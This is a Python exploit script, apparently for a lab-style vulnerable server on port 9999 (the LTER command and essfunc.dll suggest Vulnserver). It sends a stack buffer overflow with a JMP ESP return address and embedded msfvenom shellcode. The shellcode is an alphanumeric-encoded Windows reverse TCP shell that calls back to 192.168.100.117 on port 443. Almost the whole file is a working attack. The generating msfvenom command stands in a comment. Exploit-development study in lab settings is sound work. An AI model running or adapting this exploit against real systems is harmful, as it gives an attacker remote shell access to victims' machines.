#!/usr/bin/python

import socket
import os
import sys

host = "192.168.100.118"
port = 9999

# msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.100.117 LPORT=443 -f c -b '\x00' -e x86/alpha_mixed BufferRegister=ESP
# 702 bytes
shellcode = ("\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x69\x6c\x49\x78\x4b\x32\x75\x50"
"\x35\x50\x57\x70\x43\x50\x4c\x49\x78\x65\x34\x71\x69\x50\x62"
"\x44\x4c\x4b\x76\x30\x56\x50\x6c\x4b\x71\x42\x34\x4c\x4e\x6b"
"\x42\x72\x56\x74\x6c\x4b\x44\x32\x46\x48\x54\x4f\x4f\x47\x70"
"\x4a\x61\x36\x56\x51\x69\x6f\x6e\x4c\x45\x6c\x70\x61\x33\x4c"
"\x73\x32\x54\x6c\x75\x70\x7a\x61\x5a\x6f\x36\x6d\x57\x71\x6b"
"\x77\x38\x62\x7a\x52\x61\x42\x30\x57\x6e\x6b\x61\x42\x62\x30"
"\x6c\x4b\x30\x4a\x67\x4c\x6e\x6b\x62\x6c\x47\x61\x70\x78\x6a"
"\x43\x30\x48\x75\x51\x7a\x71\x76\x31\x6c\x4b\x46\x39\x77\x50"
"\x47\x71\x39\x43\x6e\x6b\x70\x49\x35\x48\x39\x73\x47\x4a\x53"
"\x79\x4e\x6b\x35\x64\x6c\x4b\x76\x61\x48\x56\x65\x61\x79\x6f"
"\x6e\x4c\x6b\x71\x58\x4f\x46\x6d\x76\x61\x4a\x67\x77\x48\x6d"
"\x30\x31\x65\x6b\x46\x53\x33\x73\x4d\x68\x78\x55\x6b\x53\x4d"
"\x47\x54\x43\x45\x59\x74\x76\x38\x6e\x6b\x63\x68\x31\x34\x55"
"\x51\x7a\x73\x65\x36\x6c\x4b\x54\x4c\x30\x4b\x4c\x4b\x53\x68"
"\x37\x6c\x36\x61\x79\x43\x6e\x6b\x33\x34\x4c\x4b\x45\x51\x5a"
"\x70\x4c\x49\x30\x44\x36\x44\x74\x64\x43\x6b\x63\x6b\x30\x61"
"\x32\x79\x50\x5a\x76\x31\x4b\x4f\x4d\x30\x43\x6f\x43\x6f\x70"
"\x5a\x6c\x4b\x56\x72\x4a\x4b\x6e\x6d\x71\x4d\x43\x58\x36\x53"
"\x65\x62\x77\x70\x77\x70\x30\x68\x72\x57\x33\x43\x66\x52\x73"
"\x6f\x72\x74\x31\x78\x32\x6c\x61\x67\x61\x36\x34\x47\x49\x6f"
"\x68\x55\x6f\x48\x4a\x30\x47\x71\x63\x30\x43\x30\x76\x49\x38"
"\x44\x32\x74\x36\x30\x62\x48\x76\x49\x4f\x70\x72\x4b\x35\x50"
"\x39\x6f\x68\x55\x66\x30\x52\x70\x70\x50\x66\x30\x53\x70\x30"
"\x50\x53\x70\x32\x70\x61\x78\x78\x6a\x74\x4f\x69\x4f\x69\x70"
"\x69\x6f\x58\x55\x6c\x57\x43\x5a\x44\x45\x33\x58\x69\x50\x4f"
"\x58\x73\x54\x50\x75\x31\x78\x46\x62\x37\x70\x33\x31\x4d\x6b"
"\x6e\x69\x69\x76\x62\x4a\x36\x70\x70\x56\x70\x57\x70\x68\x4a"
"\x39\x59\x35\x50\x74\x73\x51\x49\x6f\x6b\x65\x4c\x45\x69\x50"
"\x64\x34\x34\x4c\x79\x6f\x30\x4e\x46\x68\x74\x35\x6a\x4c\x31"
"\x78\x7a\x50\x78\x35\x59\x32\x72\x76\x59\x6f\x7a\x75\x63\x58"
"\x33\x53\x30\x6d\x71\x74\x53\x30\x6e\x69\x68\x63\x61\x47\x31"
"\x47\x32\x77\x76\x51\x79\x66\x70\x6a\x75\x42\x46\x39\x33\x66"
"\x6d\x32\x79\x6d\x33\x56\x79\x57\x52\x64\x55\x74\x77\x4c\x43"
"\x31\x63\x31\x4c\x4d\x72\x64\x46\x44\x56\x70\x59\x56\x77\x70"
"\x43\x74\x53\x64\x72\x70\x30\x56\x76\x36\x61\x46\x72\x66\x51"
"\x46\x72\x6e\x33\x66\x63\x66\x66\x33\x52\x76\x42\x48\x44\x39"
"\x6a\x6c\x75\x6f\x4b\x36\x4b\x4f\x6a\x75\x4b\x39\x69\x70\x62"
"\x6e\x62\x76\x70\x46\x59\x6f\x34\x70\x75\x38\x46\x68\x4d\x57"
"\x45\x4d\x65\x30\x59\x6f\x6e\x35\x6d\x6b\x69\x70\x47\x6d\x75"
"\x7a\x45\x5a\x75\x38\x59\x36\x4a\x35\x6d\x6d\x4d\x4d\x6b\x4f"
"\x59\x45\x75\x6c\x54\x46\x71\x6c\x56\x6a\x6b\x30\x79\x6b\x79"
"\x70\x54\x35\x47\x75\x6d\x6b\x62\x67\x56\x73\x54\x32\x62\x4f"
"\x50\x6a\x65\x50\x33\x63\x39\x6f\x38\x55\x41\x41")


buffer = "A" * 2002
buffer += "\x03\x12\x50\x62"          # 0x62501203 : jmp esp | ascii - essfunc.dll
#buffer += '\x90' * 15
buffer += shellcode
buffer += "C" * (3000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()

